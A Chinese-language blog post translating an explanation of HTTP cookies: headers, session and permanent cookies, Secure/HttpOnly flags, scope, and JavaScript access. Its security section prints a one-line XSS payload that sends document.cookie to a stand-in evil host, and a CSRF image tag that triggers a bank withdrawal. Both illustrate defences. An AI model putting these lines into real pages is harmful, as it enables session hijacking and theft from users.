---
layout: post
title: HTTP COOKIE 
date: 2017-02-012
categories: translation
---
## HTTP Cookies

一个HTTP cookie(web cookie, browser cookie) 是一小段server 发送给user browser 的data，browser可能会存储它并跟随下一次请求send it back  to the same server.典型的，它用来判断是否两次请求来自同一个browser可以用来保持用户 logged-in。它记住无状态HTTP 协议的stateful info.

Cookies 主要用于以下三种目的：

* Session managemnent(user logins, shapping carts)
* personalization（user preferences）
* Tracking (analyzing user behavior)

Cookies 也会用于通常的client-side 存储。但如果有更好的方法就不会用这一种，现在的browser 有许多可以使用的storage API。由于cookies会伴随每个request发送，这样就会造成额外的开销（尤其表现在移动端）。本地存储的新的API是 web storage API(localStorage sessionStorage)和 indexDB.

## Ceating cookies
当server 接收到一个HTTP request， 它就可以发送一个Set-Cookie header with the response.cookies 通常被存在browser 然后，在随后的跟发到该server的每个请求都会带着cookie,它作为Cookie HTTP header 的内容。额外的，可以设置过期时间和指定的domain , path ,limiting how long and to which site the cookie is sent to

## The Set-Cookie and Cookie headers
 set-cookie response header 是server发给 user agent 的。它长这样子
 
 ```
 Set-Cookie: <cookie-name>=<cookie-value>
 ```
 
 server 告诉client 要存一下这个cookie
 
 ```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
 ```
 
 现在，对于每个发到server的request, browser 都会带上之前server 让存的cookies 使用Cookie header
 
```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

## Session cookies
我们上面创建的cookie 就是一个session cookie.当client 页面关闭，就会被移除，这些cookie只存在于当前session. 他们没有指定任何Expires 或者 max-age .注意： 大多浏览器通常都有session restoring enabeld, 它会让大部分session cookies 实际上是permanent 好像browser从未被关闭。

## Permanent cookies
不像session-cookie 在client  close就过期，permanent cookies 会在指定的日期（Expires）或者是过了指定时间（Max-Age）过期.

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GM
```

## Secure and HttpOnly cookies
一个secure cookie 会被发送当request 使用了SSL和 HTTPS协议.注意， 机密和敏感信息不应该被HTTO cookie传输，因为整个机制是没有安全保证的。从Chrome 52 和ff52 不安全的sites(http:) 不能够设置带有“secure”指令的 cookies。
为了放置 cross-site scripting (XSS)attacks, HTTP-only cookies 是通过Document.cookie XHR request API 都拿不到的cookies的。当你在js脚本中不需要cookie的时候设置该属性。

## Scope of cookies
Domain , Path 指令定义了scope of cookies,具体说就是cookie被返回时的urls

domain 指定了哪些hosts cookie会被发送。如果没有被指定， 默认为当前document location (不包括subdomains). 如果domain 指定了，subdomains 就被包含了。
如果domain = mozilla.org cookies也会被设置在subdomain 像developer.mozilla.org
path 指示了一个在requested resource 中一定会存在的URL path在发送Cookie header 之前。%x2F("/")字符被解释为文件目录分隔符
如果 Path=/docs 被设置了，下列paths都会被match

* "/docs"
* "/docs/Web"

## JS access using Document.cookies
可以使用Document.cookie来创建新的cookie,如果HttpOnly flag不存在的话，就可以用js脚本来创建cookie

```
document.cookie = "yummy_cookie=choco"; 
document.cookie = "tasty_cookie=strawberry"; 
console.log(document.cookie); 
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

注意更安全的做法放在后面Security 部分。js 脚本可以获得的 Cookies 可能会被XSS 盗取。

## Security

秘密的敏感的信息都不应该使用cookies

## Session hijacking and xss

cookies 用于鉴定用户以及他的认证session. 所以从web app盗取cookie 就导致劫持了认证用户的session。通常的盗取cookies 的方法包括使用Social Engineering 或者开发一个XSS 漏洞在app中。

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
HttpOnly 属性通过阻止用js脚本获得cookie可以帮助减少这样的攻击

## Cross-site request forgery(CSRF)
考虑一个example。在这个场景下，一个img并不是真的img ，它只是要一个request 去偷取你银行账号里的钱

```
<img src="http://bank.example.com/withdraw?accout=bob&amount=100000&for=mallory">
```

如果你当前登陆了，你的cookie 仍然有效（并且没有其他验证），你就会在HTML加载img时 转移money。有一些tech 可以防止。

* 像XSS 做输入过滤
* 在任何敏感动作之前做认证
* 用于敏感操作的 cookies 应该有一个short lifetime
* OWASP CSRF prevention cheat sheet 
